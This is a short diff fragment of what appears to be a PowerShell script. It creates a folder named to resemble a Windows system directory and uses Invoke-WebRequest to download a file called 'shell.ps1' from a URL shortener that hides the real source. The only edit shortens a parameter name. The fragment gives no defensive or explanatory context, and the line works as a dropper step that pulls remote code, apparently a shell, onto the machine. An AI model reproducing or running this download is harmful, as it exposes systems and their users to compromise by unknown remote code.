@@ -4,7 +4,7 @@ mkdir c:/Window1/shell_work
 
 cd c:/Window1/shell_work
 
- Invoke-WebRequest -uri https://shorturl.at/rRcIs -Output shell.ps1
+ Invoke-WebRequest -uri https://shorturl.at/rRcIs  -O shell.ps1
 
  
 
